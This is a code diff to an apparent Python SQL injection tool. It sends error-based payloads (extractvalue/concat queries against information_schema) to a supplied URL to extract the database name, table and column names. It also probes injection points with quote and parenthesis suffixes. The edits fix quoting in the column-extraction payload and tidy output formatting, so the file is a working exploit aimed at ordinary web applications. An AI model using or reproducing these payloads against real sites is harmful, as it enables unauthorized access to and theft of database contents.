@@ -36,18 +36,13 @@ def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
         str1 = str1_num[8:]
         str2 = str1.find('\'')
         str3 = str1[:str2]
-        print("\nTable names: " + str3)
+        print(f"\nTable names: {str3}")
     elif args.columns:
         print('Extracting Columns...')
-        link = str(args.columns) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=" + args.colum_name + "limit 0,1)))--"
+        link = str(args.columns) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='" + args.colum_name + "'limit 0,1)))--"
         results = requests.get(link)
         data = results.text 
-        str_num = str(data).find('error: ')
-        str1_num = data[str_num:]
-        str1 = str1_num[8:]
-        str2 = str1.find('\'')
-        str3 = str1[:str2]
-        print("\Column names: " + str3)
+        print(f"Column names: {data}")
     elif args.dbname:
         link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
         print(link)
@@ -62,7 +57,7 @@ def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
         if str_num == -1:
             print('Access Denied')
         else:
-            print("Database name: " + str3)
+            print(f"Database name: {str3}")
     elif args.get_database_type:
         urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type[:-4] + ")", args.get_database_type[:-4] + "')", args.get_database_type[:-4] + '")', args.get_database_type[:-4] + '*']
         DBDict = {
